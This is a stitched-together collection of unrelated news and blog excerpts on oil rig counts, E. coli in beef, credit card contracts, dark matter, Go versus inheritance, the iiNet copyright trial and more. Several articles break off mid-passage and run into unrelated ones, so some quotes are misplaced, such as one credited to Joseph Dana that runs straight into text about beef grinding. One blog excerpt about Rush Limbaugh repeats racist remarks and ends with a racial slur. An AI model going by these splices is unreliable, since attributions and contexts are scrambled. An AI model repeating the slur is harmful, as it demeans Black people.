It is worth noting that the drift in rig count mix towards oil has been somewhat exacerbated by the lack of any recovery to date for the offshore rig count , which contributes to the total BHI rig count and is largely gas oriented .
Over the last 10 years , the BHI offshore rig count has averaged around 100 rigs , but this count stands at 36 rigs today and has actually fallen further since the overall rig count bottomed in June .
The oil - weighted recovery is evident in the chart below , which indexes each of the oil and gas rig counts to 100 in June when the rig count bottomed .
Currently , for every U.S. rig drilling for oil there are only two rigs drilling for natural gas , well below the average this decade of five natural gas rigs to each oil rig .
In fact , the last time the ratio was as low as current levels was in mid-1998 .
Of course , the widely touted 10:1 crude oil to natural gas price ratio has also broken free of historical norms , surging into the 20s in September and standing in the mid-teens today .
The mix shift towards oil appears likely to hold and possibly strengthen near - term given a variety of factors including 1 . ) better crude oil price performance ( and arguably fundamentals ) relative to natural gas , 2 . ) only a modest gas production response to the rig count decline thus far ( although production declines lag drilling activity declines and are likely to materialize in the coming months ) and 3 . ) shallow decline rates observed in growing gas shale plays like the Marcellus and the Haynesville .

Israeli activist Ezra Nawi was sentenced to a month in prison today on trumped up charges that he assaulted a police officer in July 2007 while protesting the demolition of a Palestinian home in the South Hebron Hills .
After the sentencing Nawi told Ynet :
" The court has been permitting the occupation for years , they are trying to stop me at all costs .
The judge does n’t scare me , and neither does the 30 - day sentence .
This is testimonium paupertatis to the court , I tried to stop criminal activity , and I ended up having to pay two officers who acted brutally .
This is the Israeli reality . "
Fellow Ta’ayush activist Joseph Dana adds :
Those low - grade ingredients are cut from areas of the cow that are more likely to have had contact with feces , which carries E. coli , industry research shows .
Yet Cargill , like most meat companies , relies on its suppliers to check for the bacteria and does its own testing only after the ingredients are ground together .
The United States Department of Agriculture , which allows grinders to devise their own safety plans , has encouraged them to test ingredients first as a way of increasing the chance of finding contamination .
Unwritten agreements between some companies appear to stand in the way of ingredient testing .
Many big slaughterhouses will sell only to grinders who agree not to test their shipments for E. coli , according to officials at two large grinding companies .
Slaughterhouses fear that one grinder ’s discovery of E. coli will set off a recall of ingredients they sold to others .
“ Ground beef is not a completely safe product , ” said Dr. Jeffrey Bender , a food safety expert at the University of Minnesota who helped develop systems for tracing E. coli contamination .
He said that while outbreaks had been on the decline , “ unfortunately it looks like we are going a bit in the opposite direction . ”
Food scientists have registered increasing concern about the virulence of this pathogen since only a few stray cells can make someone sick , and they warn that federal guidance to cook meat thoroughly and to wash up afterward is not sufficient .
A test by The Times found that the safe handling instructions are not enough to prevent the bacteria from spreading in the kitchen .
Cargill , whose $ 116.6 billion in revenues last year made it the country ’s largest private company , declined requests to interview company officials or visit its facilities .
“ Cargill is not in a position to answer your specific questions , other than to state that we are committed to continuous improvement in the area of food safety , ” the company said , citing continuing litigation .
The meat industry treats much of its practices and the ingredients in ground beef as trade secrets .
While the Department of Agriculture has inspectors posted in plants and has access to production records , it also guards those secrets .
Federal records released by the department through the Freedom of Information Act blacked out details of Cargill ’s grinding operation that could be learned only through copies of the documents obtained from other sources .
Those documents illustrate the restrained approach to enforcement by a department whose missions include ensuring meat safety and promoting agriculture markets .
Within weeks of the Cargill outbreak in 2007 , U.S.D.A. officials swept across the country , conducting spot checks at 224 meat plants to assess their efforts to combat E. coli .
Although inspectors had been monitoring these plants all along , officials found serious problems at 55 that were failing to follow their own safety plans .
Last month , Goldman Sachs said it had performed so well that its pay and bonus pot for the first nine months was up 46 per cent at £ 10.2 billion .
It was reported that they were considering donating in excess of £ 627 million to charity in an attempt to quell the furore over the likely size of the pot .
Schools might start offering abortions if healthcare reform passes , Rep. Michele Bachmann ( R - Minn . ) warned last night .
Speaking on the House floor , Bachmann raised concerns about the " school based health clinics " discussed in H.R. 3200 , which she said were merely " sex clinics " designed to bring Planned Parenthood into the nation 's schools .
Though bill specifically requires these clinics to follow federal , state and local law concerning parental consent , Bachmann claimed that the school - based health center might provide abortions without informing a student 's guardian .
There 's no passage in the bill to support this claim , and Bachmann 's office did n't immediately respond to a request for clarification .
Here 's the relevant passage from her floor speech :
But parents are going to excluded from Planned Parenthood as they write these clinics because the bill orders that these clinics protect patient privacy and student records .
What does that mean ?
It means that parents will never know what kind of counsel and treatment that their children are receiving .
And as a matter of fact , the bill goes on to say what 's going to go on -- comprehensive primary health services , physicals , treatment of minor acute medical conditions , referrals to follow - up for specialty care -- is that abortion ?
Does that mean that someone 's 13 year - old daughter could walk into a sex clinic , have a pregnancy test done , be taken away to the local Planned Parenthood abortion clinic , have their abortion , be back and go home on the school bus that night ?
Mom and dad are never the wiser .
This does n't mesh with the bill 's language , however .
Section 2511 specifically states that such clinics must follow state laws governing parental consent .

Who ’s Better at IT ?
Younger Digital Natives or Older Digital Immigrants ?
I was asked this question at a recent speaking engagement in Utah , and I ’ve thought about it a bit more since then .
“ Digital natives ” are people who grew up using digital technology ; they used computers as children and so they never lived in a non-computer world .
“ Digital immigrants ” grew up in a world that did n’t have computers , and they made the leap to the digital world as foreigners .
Each group brings its own advantages to IT .
Digital natives :
Are more intuitive about new technology .
They more easily understand how to use digital devices and systems in their everyday lives .
They more easily understand how to use digital devices and systems in their everyday lives .
Easily understand modality in user interfaces .
It ’s natural for them to see the same control used for different things in different contexts .
Naturally relate to parallel processing , since they already multi-task in their everyday lives .
Easily understand virtual metaphors like computer mice , virtual documents and avatars .
The controls for video games like the Wii have taken virtual metaphors to a whole new level .
Have an inherent understanding of the advantages of mobile computing and being connected .
Digital natives are never out of touch .
Want quick results .
They like projects which offer early benefit .
Use devices and apps as natural tools the same way that some people might use a hammer or a screwdriver .
Pick it up , use it , put it down .
No big deal .
Are better with interactive systems since all of their games , devices and systems are interactive .
Digital immigrants :
Understand the non-technology ways of doing things , and have a better appreciation for how and why things in our current business got to where they are .
Better relate to processes that contain a mix of manual and automated tasks , and have a better feel for the advantages and disadvantages of automating a process .
Can be better at applying non-digital models to digital systems because of the digital immigrants ’ richer and more varied experience .
Are more detail focused , and are more likely to take a craftsman approach to systems design and building .
Have longer attention spans .
They look for long - term solutions to their problems .
View systems and processes holistically — it ’s much more than the devices and apps themselves .
Systems are designed to be comfortable for constant use — not necessarily for quick in - and - out efficiency .
Are better with non-interactive systems like large - scale data manipulation or transaction processing , or systems which require great reliability or scalability .
Together , the two groups can achieve great things .
But is it really fair to ask which group is better ?
You can ask this about any two generations that grew up on different sides of a major paradigm shift .
For example , were people who grew up without electricity better at mechanical design than “ electrical natives ? ”
Were people who grew up with a car better at social skills than “ automotive immigrants ? ”
Ultimately , I do n’t think one group is better than the other .
The world changes , and each generation adapts to the needs of the new world .
Inevitability , some people are slow to adapt and others adapt quickly .
But it ’s not necessarily younger people who adapt faster — it ’s a function of the individual .
I believe that each younger generation will develop the skills they need to resolve the problems of the future .
The approach may be different than the prior generation , but “ better ” is n’t the right word to use .
We learn , we grow , we evolve , we adapt to the new world in which we live .
The natives of one world become immigrants to the next .

Dr. Ericsson also said his method was unlikely to alter the sex balance of the population .
He said couples who use his method are about evenly divided , with 52 per cent favoring girls .
In most cases , it is parents who have had children of only one sex would like one child of the other .
Artificiality Poses Barrier
Another brake on widespread use of the method is its artificiality .
It requires a number of steps - semen collection , multi-step sperm segregation , and artificial insemination .
The American Fertility Society noted in a report last year on ethical considerations of new reproductive technologies that artificial insemination '' may make reproduction excessively technologic by separating procreation from sexual expression . ''
Dr. Ericsson scoffed at the suggestion that the procedure raises moral problems .
He contrasted this with cases reported from India where a fetus was allegedly aborted if , from tests in early pregnancy , it was not of the desired sex .
Such ethical questions are on the agenda of the World Congress on Human Reproduction to be held in Tokyo next month with Dr. Iizuka as president .
Based on Density Differences
Dr. Iizuka 's said his procedure was a variation of a method used to sort out blood cells of slightly different composition .
It is based on differences between sperm carrying X chromosomes , which produce girls , and Y chromosomes .
The DNA content of X - bearing sperm has been found 2.7 percent greater than that of Y - bearing sperm .
The rate at which the cells migrate through a silica gel , when subjected to rapid spinning in a centrifuge , depends on their size , mass or other subtle properties .
In the sex - selection method , a layer of diluted semen is laid on top of a sequence of increasingly dense layers of a Swedish silica gel , Percoll , and for 20 minutes of centrifugation is subjected to a force 250 times that of gravity .
Sperm containing the female chromosome migrate through the layers slightly faster than those with the male chromosome .
Male sperm can be identified because a spot within their nuclei glows when stained with a fluorescing compound .
After centrifugation , Dr. Iizuka said , 85 percent of the sperm in the top layer proved to be male and 95 percent of those at the bottom were female .
Sperm drawn off from each layer could then be used for insemination .
PARIS — Almost five months after an Air France jetliner crashed in the Atlantic Ocean , the airline is warning its pilots to follow safety procedures more closely and to stop criticizing the carrier .
But its pilots are bristling at what they perceive as a rebuke , saying that management is blaming them for its failure to maintain safety .
In a memo sent to all cockpit crew last week , the unit of Air France - KLM SA said a review of recent safety incidents showed that some of them occurred because pilots had disregarded basic procedures .

Washington ( CNN ) --
Have you ever read your credit card contract ?
If not , you 're not alone .
Most cardholders never read the long complicated legalese in a credit card agreement .
It 's one reason so many people are stunned when they 're hit with unexpected rate increases or penalty fees :
It 's in the small print .
CNN asked 13 credit card holders to review a basic five - page credit card agreement .
Only four of them were able to find the annual percentage rate , and it was n't easy .
" It 's very confusing , and I 'm an intelligent person , " Amy Gould said , adding that she thinks the credit card companies have a stake in keeping their agreements opaque .
" I think it tries to make the consumer confused .
It takes advantage . "
Alan Siegel thinks he has the answer .
He runs Siegel + Gale , a marketing firm that 's specialized in contract simplification for 30 years .
He 's simplified agreements for the Internal Revenue Service , the U.S. Mint , major banks and insurance companies .
He believes that it 's time credit card companies got on board .
According to Siegel , the current contracts are full of " gobbledygook . "
He insists that " it 's a total disregard and disrespectful to the relationship with the consumer . "
He believes that card companies can make their agreements crystal clear .
Sielgel explains how he goes about trying to simplify contracts
He 's developed an example .
His simplified credit card contract takes up just one side of one page ; his research shows that a 10th - grader could understand it .
Siegel says that because it's so clear , " it encourages people to read it and understand their rights and obligations . "
Siegel says he 's shown the agreement to credit card companies .
Their reaction ?
" Panic . "
Why ?
" It 's revolutionary , " he theorized .
Those representing the credit card industry dispute that contention , saying they support simplification but are working within some constraints .
Siegel develops his contracts with contract and consumer lawyers and explains that corporate lawyers have resisted simplified agreements because " the premise has always been that you 're putting the organization at legal risk , but you 're not . "
Read the simplified credit card statement
One institution is taking a step in a user - friendly direction .
Beginning in December , Bank of America will be sending its credit card customers a one - page breakdown of their fees and rates .
It wo n't replace the complicated credit card agreement , but the one - page " clarity commitment " will outline what the bank considers the most important information customers want to know .
Most of the other credit card companies would n't comment .
They referred questions to the American Bankers Association , which blames government regulation and corporate lawyers for the convoluted agreements .
" Part of it is the nature of contract law .
Some of it is required state and federal disclosures , and some of it is the result of court cases that have insisted that certain information , certain words be in the contract , " said Nessa Feddis , senior vice president of the bank group .
Feddis discusses the wording of the agreements
Many in Congress disagree , and they 're gearing up to limit the fine print .
Democrats on the Senate Banking , Housing and Urban Affairs Committee and the House Financial Services Committee are pushing legislation that would create a new consumer protection agency .
One of its missions would be to make credit card agreements easy to understand .
" Americans deserve to receive clear and accurate information , to be protected from hidden fees and abusive terms , and to know that the financial products that they 're being offered are safe , " said Senate panel Chairman Chris Dodd , D - Connecticut .
Those drafting the legislation say this agency would simplify contracts , requiring plain English writing and stripping away incomprehensible disclosures .
But the most controversial piece ?
The agency could push companies to offer simpler credit cards with fewer tricks and traps .
Republicans in the House and Senate oppose the Democrats ' vision of the consumer agency , but they support alternate approaches that beef up consumer protections and empower federal regulators to stop abusive practices .
Said Texas Rep. Jeb Hensarling , who sits on the Financial Services Committee , " I want a consumer agency that helps consumers get effective disclosure .
I do n't want a consumer agency that takes away consumer rights . "
But the industry is fighting the reforms .
The American Bankers Association and the U.S. Chamber of Commerce argue that they 'll stifle innovation and limit consumer choice .
The bankers group 's Feddis insists , " It 's important to protect people , the vulnerable groups .
But the problem is to do it in a way that the vast majority of people who manage their financial products very well continue to have choice . "
The Federal Reserve has the power to simplify credit card contracts and has approved some changes regarding disclosures .
They go into effect next year .
Read what the Fed has done
Consumer advocates shrug at the Fed 's move .
" What the Fed did will help , " said Chi Chu Wu of the National Consumer Law Center , but it " will not be enough . "
Congress is still debating the consumer reforms .
Do n't expect a vote on them until next year .
In the meantime , Siegel says , he wishes credit card companies would take steps to simplify contracts on their own .
" These are smart companies .
We should encourage these companies to do things more intelligently and clean up their contracts . "
He believes that it would be good for their business .
" It would go a long way to re-ignite the trust people have in financial institutions . "
As for the simplified contract Siegel drew up ?
It was a big hit with our 13 cardholders .
" This is absolutely very clear .
It 's very quick and easy , " Ellen Hunt said .
Ron Wilkerson agreed .
He added with a laugh , " This is basically all you need to see .
And it 's one page , so when I shred it , it wo n't break the machine . "
An international team of astronomers have found an unexpected link between mysterious ' dark matter ' and the visible stars and gas in galaxies that could revolutionise our current understanding of gravity .
One of the astronomers , Dr Hongsheng Zhao of the SUPA Centre of Gravity , University of St. Andrews , suggests that an unknown force is acting on dark matter .
The findings are published this week in the scientific journal Nature .
Only 4 % of the universe is made of known material .
Stars and gas in galaxies move so fast that astronomers have speculated that the gravity from a hypothetical invisible halo of dark matter is needed to keep galaxies together .
However , a solid understanding of dark matter as well as direct evidence of its existence has remained elusive .
Now the team believes that the interactions between dark and ordinary matter could be more important and more complex than previously thought , and even speculate that dark matter might not exist and that the anomalous motions of stars in galaxies are due to a modification of gravity on extragalactic scales .
Dr. Benoit Famaey ( Universities of Bonn and Strasbourg ) explains : " The dark matter seems to ' know ' how the visible matter is distributed .
They seem to conspire with each other such that the gravity of the visible matter at the characteristic radius of the dark halo is always the same .
This is extremely surprising since one would rather expect the balance between visible and dark matter to strongly depend on the individual history of each galaxy . "
Dr. Zhao at the SUPA Centre of Gravity notes , " The pattern that the data reveal is extremely odd .
It 's like finding a zoo of animals of all ages and sizes miraculously having identical , say , weight in their backbones or something .
It is possible that a non-gravitational fifth force is ruling the dark matter with an invisible hand , leaving the same fingerprints on all galaxies , irrespective of their ages , shapes and sizes . "
Such a force might solve an even bigger mystery , known as ' dark energy ' , which is ruling the accelerated expansion of the Universe .
A more radical solution is a revision of the laws of gravity first developed by Isaac Newton in 1687 and refined by Albert Einstein 's theory of General Relativity in 1916 .
Einstein never fully decided whether his equation should add an omnipresent constant source , now called dark energy .
Dr Famaey added , " If we account for our observations with a modified law of gravity , it makes perfect sense to replace the effective action of hypothetical dark matter with a force closely related to the distribution of visible matter . "
The implications of the new research could change some of the most widely held scientific theories about the history and expansion of the universe .
Lead researcher Dr. Gianfranco Gentile at the University of Ghent concludes , " Understanding this puzzling conspiracy is probably the key to unlock the formation of galaxies and their structures . "
It now seems clear why the staff to former Alaska Gov. Sarah Palin did n’t want anyone to bring recording devices or cell phones to her speech Friday night .
Even news outlets like Politico — which have prominently featured Dick Cheney ’s terror jeremiads — would have been likely to lampoon her .
But the ban on recording devices did n’t stop them .
Politico says they bought three tickets to Palin ’s Wisconsin speech and then penned a write - up .
Their review was somewhat grim , taking aim at Palin ’s frequent use of the words “ bogus ” and “ awesome ” and delivering a strange anecdote about dollar coins .
ADVERTISEMENT
“ Palin had remarks prepared but frequently wandered off - script to make a point , offering audience members a casual “ awesome ” or “ bogus ” in discussing otherwise weighty topics , ” Jonathan Martin wrote in his review .
He quotes Palin as saying , “ It is so bogus that society is sending a message right now and has been for probably the last 40 years that a woman is n’t strong enough or smart enough to be able to pursue an education , a career and her rights and still let her baby live . ”
“ Other Palin touchstones included : praise for the military , jeers for the “ the liberal media ” and a general manner of speaking that often veered into rhetorical culs - de- sac , ” he continued .
Palin did n’t draw supporters to their feet : “ While she drew applause during her remarks , Palin ’s extemporaneous and frequently discursive style was such that she never truly roused a true - believing crowd as passionate about the issue at hand as she .
Not once during her address did they rise to their feet . ”
They did stand at the end , however .
She then got a standing ovation from most of the crowd , but a few had begun to leave before she even finished and within seconds of her concluding , scores more got up and put on their jackets as they walked away .
In addition to the suggestion that government officials would consider hastening the death of the infirm or handicapped , she began her remarks with a puzzling commentary on the design of newly minted dollar coins .
Noting that there had been a lot of “ change ” of late , Palin recalled a recent conversation with a friend about how the phrase “ In God We Trust ” had been moved to the edge of the new coins .
“ Who calls a shot like that ? ” she demanded .
“ Who makes a decision like that ? ”
She added : “ It ’s a disturbing trend . ”
ADVERTISEMENT
The decision to put “ IN GOD WE TRUST ” on the edges of presidential dollar coins has received little attention from the press , but was reversed in 2007 , before President Barack Obama took office .
Sens. Sam Brownback ( R - KS ) and Robert Byrd ( D - WV ) sponsored legislation to move the motto back to the front face of the coins .
“ It is important that our national motto , ‘ In God We Trust , ’ is prominently displayed on all of our currency , ” Brownback said .
“ We should not relegate our heritage to the side . ”
Some of Palin ’s recent speeches have also received lackluster reviews .
At a recent speech in Hong Kong ( which also banned the press ) some delegates purportedly “ walked out in disgust . ”

Rush Limbaugh wants to be an NFL owner .
Or does he ?
Jason Whitlock says it ’s a publicity stunt , and he may be right .
Glenn Beck has been getting a lot of run lately and Rash needs to maintain his position as the Barking Right ’s alpha blowhard .
Whitlock also wonders why the NFL ’s uber - dominator , Commish Roger Goodell , did n’t immediately neuter this , the Mother of All Bad Ownership Ideas .
After all , a high percentage of the league ’s players , coaches and fans are black , and Rush has a history of saying bad things about black people .
Some samples :
Obama is “ more African in his roots than he is American ” and is “ behaving like an African colonial despot ”
“ Barack Obama has picked up another endorsement : Halfrican American actress Halle Berry . ”
Limbaugh then said : ” ‘ As a Halfrican American , I am honored to have
Ms. Berry ’s support , as well as the support of other Halfrican Americans , ’ Obama said . ”
Limbaugh then conceded that Obama “ did n’t say it . ”
“ Obama has disowned his white half … he ’s decided he ’s got to go all in on the black side ”
Obama “ the greatest living example of a reverse racist ”
Limbaugh sings “ Barack , The Magic Negro ”
“ Here you have a black president trying to destroy a white policeman ”
“ [ W ]e saw white firefighters under assault by agents of Barack Obama ” ; “ Now white policemen are under assault ”
Obama would not have acted if he ’d known that the Somali pirates were “ actually young , black Muslim teenagers ”
Limbaugh suggests
Dems , media believe “ you ca n’t criticize the little black man-child ”
Obama ’s nomination “ goes back to the fact that nobody had the guts to stand up and say no to a black guy ”
“ The government ’s been taking care of [ young blacks ] their whole lives ”
“ The days of them not having any power are over , and they are angry ”
There was also the time ESPN was dumbass enough to let Limbaugh on their pre-game show .
That did n’t work out so well , did it ?
Let ’s set aside for a second the obvious troubling question about how a team with Rush at the helm would get new players , since presumably it would dodge the draft .
And the also - obvious question of whether , given its stance against illegal drug use , the league would be forced to ban Limbaugh from his own facility .
Instead , let ’s ask a more basic question : why would a guy like Limbaugh want to own an NFL team , knowing all the hassle involved in the process ?
I think I have it figured out .
Because it ’s the closest he can get , in this day and age , to actually being able to buy , sell and trade Negros .
There .

Interfaces vs Inheritance ( or , watch out for Go ! )
by Michele Simionato
November 15 , 2009
Summary
Some musings about my personal history with inheritance and interfaces , solicited by the release of the Go language this week .
Advertisement
I am an atypical programmer , since I spent most of my career doing science , not programming .
When I first learned about Object Oriented Programming , a little bit more than seven years ago , I compared it with my experience in Mathematics and Physics .
I was puzzled .
In Mathematics you have objects ( consider for instance the elements of a Lie group ) but the objects themselves are not important : the important entities are the relations about the objects , their properties .
When I write a + b in a mathematical expression I am not really interested in the objects : a and b may be numbers , or matrices , or functions , or even operators in a Hilbert space if I am doing Quantum Mechanics : in any case , the important thing is the addition operation .
The + means that I am performing a commutative operation and therefore that the objects I am using are part of a commutative group and a set of well know properties are valid for them .
Translated into programming jargon , that idea means exactly that the important things are the interfaces , i.e. the set of operations / methods which are available to the objects , not the objects themselves .
Actually , the details about what the objects really are can be disregarded as implementation artifacts and I can write generic code which works for all objects satisfying a known interface , just as in Mathematics I can write a single proof valid for the entire class of entities satisfying a given set of properties .
This was my forma mentis when I begun studying object orientation .
I was used to consider functions as the primary entities , and objects as inert material on top of which functions operate .
Actually , it seemed backwards to me to attach functions to ( classes of ) objects .
In traditional ( Smalltalk - inspired ) OOP instead this is exactly what happens .
One focuses on objects : one writes window.create( ) , not create ( window ) .
One is induced to put the focus on the window which owns the .create method and not on the general operation of creation which is meaningful for all kinds of objects .
Anyway , I kept studying and at the end I become acquainted with the OOP approach : I was no more disturbed by window.create ( ) vs create ( window ) .
It is ironic that a year later I discovered Lisp and its object system ( CLOS ) where you indeed write create ( window ) .
It is understable that I immediately became a supporter of generic functions : I decided that I was right the first time after all ;)
It is also clear why I am a supporter of functional programming .
Nowadays , after years of experience writing an maintaining large code bases , I am even more convinced the really important things are not the objects ( or classes ) but the interfaces .
During my first six months of OOP programming I also had issues with another concept : inheritance .
I remember that when I saw classes for the first time I said " look ma , objects are just the same as Pascal records and methods are just functions taking a record as first argument , they are not difficult at all ! " .
It turns out I was wrong .
Classes are very much different than Pascal records , the reason being inheritance .
Inheritance makes classes quite nontrivial , and I had to write a paper on inheritance to understand its gory details ( my first paper about programming , the infamous MRO paper ) .
At that point however I only understood the tecnical details ; but a year later I was hired as a programmer , I started working with Zope and then I understood what inheritance really was in the real word .
From that time I started looking for alternative solutions to inheritance .
I remember that once ( something like 4 or 5 years ago ) I implemented a toy object system in Scheme without inheritance , to see how it was like to program without it .
From that experiment I concluded that one cannot really avoid single inheritance ( I mean , you can , but then you have to implement some workaround which is more or less equivalent to it ) whereas instead you can easily throw multiple inheritance out of the window .
A couple of years ago I also became interested in the language SML which I really liked for various reasons , the most important being the lack on inheritance and the presence of interfaces .
It is at that moment that I decided to start a public campaign against inheritance and pro interfaces .
Interfaces are the really important idea , not inheritance , but unfortunately many languages conflate the two concepts and make things confusing .
Inheritance is a ( often wrong ) way of ensuring interface compliance , in the sense that a subclass satifies the same interface of its superclass , but in general two objects can have the same interface without having a common base class .
After studying SML I became really convinced that there should be a formal way to specify that property in the language .
I also decided to write a set of articles about the dangers of inheritance : I published on Artima four papers about mixins ( 1 , 2 , 3 and 4 ) , a paper about generic functions and a paper about traits for people still emotionally attached to the Smalltalk OOP model and not wanting to switch to the CLOS model .
I also planned to write a paper about interfaces , to explain how things should be done , but I never wrote it .
The main reason is lack of time , since I was busy with The Adventures of a Pythonista in Schemeland and other things ; there is also a secondary reason ; I needed a language with interfaces done right to explain what I had in mind , and I was reluctant to use SML as that language .
I mean , SML is very nice and it does interfaces really well , but it is definitively not a language for the large public .
Python has interfaces ( starting from Python 2.6 ) which are acceptable but not really what I had in mind .
Now finally there is Go .
Go is a new language which was released this week by Google ; it was designed by old - timers of the caliber of Rob Pike and Ken Thompson , so I decided to take it very seriously and to have a look at it .
It turns out that Go lacks inheritance and it has something similar to the kind of interfaces I had in mind for all this time .
I do not need to write my paper about interfaces vs inheritance anymore : just look at Go documentation !
I am still playing with Go at the moment .
As every language it has a few good things and a few bad things .
I particularly like two blog posts by Mark Chu - Carroll ( this and that ) .
Of course everybody is writing about Go nowadays and you can find tons of comments about the language on the net .
There is also an extremely activew newsgroup .
Here I just wanted to point out the design choices about interfaces and inheritance .
Such ideas are not new and it is a shame that no popular language has followed such particular route in the design space .
I hope Go will become popular ; if not , I hope such ideas will finally enter in a popular language , we are already 10 or 20 years too late :-(

Almost six - figure sums of copyright infringements alleged to have taken place on iiNet 's network were " pings " by an investigator rather than downloads of a file , the ISP 's general counsel told the court today .
In the first opportunity for iiNet to publicly state its case before the Federal Court , the ISP 's general counsel Richard Cobden immediately sought to dampen the figures shared by the film industry yesterday .
Cobden invariably described the figures as " artificial " , " inflated " and " highly exaggerated " .
" With all due respect , there is a very clear attempt to colour allegations of authorisation with these very large numbers , " he alleged .
" How many times does someone infringe by making a film available online ?
Our learned friends [ of the plaintiff ] say it 's a repeated act , we submit it 's one act and [ a ] continuing act . "
The ISP alleged that each infringement counted by the film industry actually represented a " ping " made by an investigator to an iiNet user 's computer requesting whether all or part of a copyrighted file could still be accessed through BitTorrent .
The pings were made by investigators regularly at unspecified time intervals , it was alleged .
They did not represent a separate internet user downloading or attempting to download the available file , iiNet 's counsel alleged .
" It follows that if they 'd sent out this call [ ping ] every minute rather than the selected period they could have easily created thousands of infringements , " Cobden claimed .
As a further example , if a film was available via the BitTorrent protocol for three weeks - and the computer it was hosted on pinged by an investigator every second - it could rack up some 1.8 million " infringements " , it was alleged .
The numbers of potential infringements presented by iiNet in evidence would be " in the hundreds " rather than the almost 100,000 figure reported yesterday .
But iiNet 's intention was not to water down the impact of any alleged infringement , Cobden said .
" We 're not suggesting to bring the figure down to a trifling number that your honour will say ‘ That 's simply not worth worrying about ' , " he alleged .
The ISP 's counsel also said that " accepting the primary acts [ of infringement ] does not mean iiNet condones them . "
He said the ISP did not know who was making the files available online .
" It 's not a computer that makes something available online - it's a person , " Cobden alleged .
" Someone 's got to take some overt action .
We do n't know who [ that ] was . "
iiNet said on Friday the infringer could " be the partner , child , flat - mate , employee or customer of the account holder " or even a stranger passing an account holder 's unsecured wireless network .
Cobden told the court that " one can not tell from [ the identity of the account holder ] the individual who did these [ infringing ] acts . "
Japan 's National Police Agency reported Thursday that marijuana arrests were at an all - time high during the first six months of this year .
Police said 1,446 were arrested for possessing , using or trafficking in marijuana , up 21.3 % from a year earlier .
Of those arrested for pot offenses , 63.2 % were under the age of 30 , suggesting that marijuana use is spreading among young people .
One hundred four people were arrested for marijuana cultivation , up 40.5 % over the same period last year .
Home cultivation of marijuana is assisted by the availability of seeds and grow supplies over the Internet and by consumers ' fears of venturing into illicit drug markets .
The 40.5 % increase in grow busts in the first half of this year comes after a 50 % increase in grow busts during the first half of last year .
The record arrest figures come as Japan comes to grip with a growing marijuana culture .
In the past couple of years , the country has seen repeated " scandals " around marijuana use , including the expulsion of three Russian wrestlers from sumo competition for smoking pot , the arrests of various celebrities , and a national freak - out over students at prestigious universities smoking pot .
The apparent increase in marijuana use in Japan comes despite mass media denunciations of it and despite harsh drug laws .
Under the 1948 marijuana control law , any pot offense can earn a prison term of up to 10 years .
GnuVince just showed me the new Perl 6 logo .
The butterfly Camelia :
Clearly , it looks more like a logo for some kind of association for preschoolers or for a day - care center than a logo for a programming language .
It ’s repulsively cute .
Seeying that , I joked with GnuVince that ’d I rather have a logo that felt more like the hybrid , duct - taped , patchwork Perl actually is , so I drew the hippocamptopus :
My friend systemfault took the drawing of the cussing hippocamptopus and made a O’REILLY parody of it :

Sony are quite proud of its PlayStation 3 , even touting “ It only does everything ” .
The PS3 ’s multimedia capabilities include everything from HD gaming , to Blu - Ray movies , to digital photos , and more .
Because of its wide - array of uses , Sony is confident that the PS3 will sell other related consumer electronics products at retail this holiday season .
According to Jack Tretton , President and CEO of Sony Computer Entertainment America :
“ You can find the PS3 not only in the gaming Isle this holiday season , you ’ll see it where home theaters are sold , where blu - ray movies are sold …. there ’s multiple places in the store where we should be and where we will be this holiday season . ”
Many gamers are already familiar with the PS3 ’s strong multimedia abilities , but the average Joe shopper may not which is the reason behind Sony ’s strategy of marketing their gaming machine in other areas of your preferred electronics store this holiday season .
Tretton ’s belief is that the PS3 has a major influence on other forms of media purchases by a consumer such as CDs , blu - ray movies , HDTVs and , to a degree , digital cameras as well .
He continues ,
“ … if they buy a PS3 that retailer can sell them games , they can sell them movies , they can sell them music , there are multiple forms of media that are being played through there that people are consuming at the retail level , you buy a stand alone blu - ray player it ’s going to help them sell movies , but it ’s not going to help them sell games or music or some other devices . ”
Sony has always contended that they wanted the PS3 to be at the center of your home ’s multimedia design , and this holiday season they seem poised to strike at the heart of that meaning stronger than they have in previous years .
Armed with a killer line up of game software coupled with the recently reduced price and redesigned Slim model , this could very well prove to be Sony ’s best year since launch .

Unfortunately the data for this index only goes back to 2002 .
Note :
Any reading below 100 shows contraction for this index .
The index is a year - over - year index , so the headline index might be slow to recognize a pickup in business , but the underlying details suggests ongoing weakness .
From the National Restaurant Association ( NRA ) : Restaurant Industry Outlook Improved Somewhat In October as Restaurant Performance Index Posted First Gain in Three Months
[ T ]he National Restaurant Association ’s ... Restaurant Performance Index ( RPI ) ... stood at 98.0 in October , up 0.5 percent from its September level .
However , the RPI still remained below 100 for the 24th consecutive month , which signifies contraction in the index of key industry indicators .
“ Although restaurant operators continue to report soft same - store sales and customer traffic levels , they are somewhat more optimistic about improving conditions in the months ahead , ” said Hudson Riehle , senior vice president of the Research and Knowledge Group for the Association .
“ Restaurant operators reported a positive six - month economic outlook for the fourth consecutive month , and the proportion planning for capital expenditures rose five percentage points . ”
...
The Current Situation Index , which measures current trends in four industry indicators ( same - store sales , traffic , labor and capital expenditures ) , stood at 96.5 in October – up 0.4 percent from September and its first improvement in three months .
However , October still represented the 26th consecutive month below 100 , which signifies contraction in the current situation indicators .
Restaurant operators reported negative same - store sales for the 17th consecutive month in October , with the overall results similar to the September performance .
...
Customer traffic also remained soft in October , with operators reporting net negative traffic for the 26th consecutive month .
...
Although sales and traffic levels remained soft , operators reported a modest uptick in capital spending activity .

Update - Nov 11 , 2010
Since ILC 2010 was held in October , 2010 , it is likely that the next conference will be held in 2012 .
International Lisp Conference 2011
It is time to begin preparing for ILC - 2011 , the International Lisp Conference 2011 .
As a first step , the ALU is soliciting bids for locations to host this conference .
Right now , the ALU is looking for plausible venues .
Bids should show what the conference might look like , but not specify how to actually run it .
A few phone calls may be helpful in getting estimates , but do n't worry about getting details .
Your bid is just a proposal ; the ALU will request more information as bids are being evaluated .
Submitting a bid does not bind you to execute it ; the decision to commit can be made later .
The following outline may be helpful in preparing your bid ; points marked " [ detail ] " can be skipped in this initial bid .
Bids will be evaluated by the features of their venue , not by the their length or literary quality .
Host city travel time to nearest international airport other ways to arrive [ detail ] availability and cost ( low / med / high ) of evening meals estimated conference attendence from local communities [ detail ] excursions which may be organized for attendees
Room and board one or two hotels to reserve rooms for at least 100 attendees estimated room cost ( single / double occupancy ) [ detail ] number of rooms available internet availability complimentary breakfast available ?
travel time to the conference facilities [ detail ] when we need to book , and cancelation policies
